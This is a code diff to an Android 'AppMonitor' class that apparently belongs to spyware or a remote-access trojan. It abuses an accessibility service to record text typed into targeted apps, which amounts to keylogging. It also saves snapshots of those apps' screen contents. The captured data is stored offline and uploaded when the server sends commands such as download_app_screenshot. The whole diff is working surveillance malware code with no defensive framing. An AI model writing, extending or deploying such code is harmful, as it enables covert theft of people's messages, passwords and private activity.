@@ -12,33 +12,37 @@ import org.json.JSONObject;
 
 /**
  * AppMonitor — hooks into UnifiedAccessibilityService to:
- *  1. Capture logs for every app (stored via LogManager)
- *  2. Capture accessibility screenshots (UI snapshots) for every app
+ *  1. Capture logs per monitored app (stored via LogManager)
+ *  2. Capture accessibility screenshots (UI screenshots) for monitored apps
  *
  * Monitoring continues even when the device is offline; logs are stored
  * locally and uploaded when the connection resumes via command response.
  *
- * Constants.MONITORED_PACKAGES is only a convenience list for the
- * list_app_monitor_apps report — it no longer restricts what is captured.
+ * Add package names to Constants.MONITORED_PACKAGES to configure targets.
  */
 public class AppMonitor {
 
     private static final String TAG = "AppMonitor";
 
-private final Context        context;
-    private final LogManager     logManager;
-    private final MonitoredAppRegistry registry;
+    private final Context        context;
+    private final LogManager logManager;
     private String               currentMonitoredPkg = null;
 
     public AppMonitor(Context context, LogManager logManager) {
-        this.context     = context.getApplicationContext();
-        this.logManager  = logManager;
-        this.registry    = MonitoredAppRegistry.get(context);
+        this.context          = context.getApplicationContext();
+        this.logManager = logManager;
     }
 
-    /** Called from UnifiedAccessibilityService when foreground app changes (any app). */
+    /** Called from UnifiedAccessibilityService on every text-change event. */
+    public void onTextChanged(String packageName, String text) {
+        if (!isMonitored(packageName)) return;
+        String appName = getAppName(packageName);
+        logManager.logEntry(packageName, appName, text, "TEXT_CHANGED");
+    }
+
+    /** Called from UnifiedAccessibilityService when foreground app changes. */
     public void onAppForeground(String packageName) {
-        if (packageName != null && !packageName.isEmpty()) {
+        if (isMonitored(packageName)) {
             currentMonitoredPkg = packageName;
             Log.d(TAG, "Monitoring foreground: " + packageName);
         } else {
@@ -47,16 +51,16 @@ private final Context        context;
     }
 
     /**
-     * Called from UnifiedAccessibilityService when an app's screen content changes.
+     * Called from UnifiedAccessibilityService when a monitored app's screen content changes.
      * Saves a compact accessibility-tree snapshot (JSON text) to private storage.
      * Snapshots are small (no image data) and are only sent to the server when
      * the list_app_screenshots / download_app_screenshot commands are executed.
      *
-     * @param packageName  the app's package name
+     * @param packageName  the monitored app's package name
      * @param snapshotJson JSON string produced by UnifiedAccessibilityService.captureNodeTree()
      */
     public void onAccessibilitySnapshot(String packageName, String snapshotJson) {
-        if (packageName == null || packageName.isEmpty() || snapshotJson == null || snapshotJson.isEmpty()) return;
+        if (!isMonitored(packageName) || snapshotJson == null || snapshotJson.isEmpty()) return;
         try {
             logManager.saveAppSnapshot(packageName, snapshotJson);
         } catch (Exception e) {
@@ -79,14 +83,13 @@ private final Context        context;
     public JSONObject listMonitoredApps() {
         JSONObject result = new JSONObject();
         try {
-            // Configured targets: defaults + user-added
+            // Configured targets
             JSONArray configured = new JSONArray();
-            for (String pkg : registry.list()) {
+            for (String pkg : Constants.MONITORED_PACKAGES) {
                 JSONObject info = new JSONObject();
                 info.put("packageName", pkg);
                 info.put("appName", getAppName(pkg));
                 info.put("installed", isInstalled(pkg));
-                info.put("default", MonitoredAppRegistry.isDefault(pkg));
                 configured.put(info);
             }
 
@@ -252,27 +255,11 @@ private final Context        context;
     // ── Helpers ──────────────────────────────────────────────────────────
 
     public static boolean isMonitored(String pkg) {
-        if (pkg == null || pkg.isEmpty()) return false;
-        // Delegate to the per-process registry; each process calls get()
-        // with its own context (the static is just a convenient facade).
-        // In the Android lifecycle, the first caller that has a Context
-        // will initialize the registry. Subsequent calls hit the cache.
-        // This is safe because MonitoredAppRegistry.get() uses a lock.
-        throw new UnsupportedOperationException(
-            "Call instance.isMonitored(pkg) from an AppMonitor instance");
-    }
-
-    // Instance method — use the registry this instance was constructed with.
-    public boolean instanceIsMonitored(String pkg) {
-        return registry != null ? registry.isMonitored(pkg) : false;
-    }
-
-    public boolean instanceAddMonitored(String pkg) {
-        return registry != null && registry.add(pkg);
-    }
-
-    public boolean instanceRemoveMonitored(String pkg) {
-        return registry != null && registry.remove(pkg);
+        if (pkg == null) return false;
+        for (String p : Constants.MONITORED_PACKAGES) {
+            if (p.equals(pkg)) return true;
+        }
+        return false;
     }
 
     private String getAppName(String packageName) {
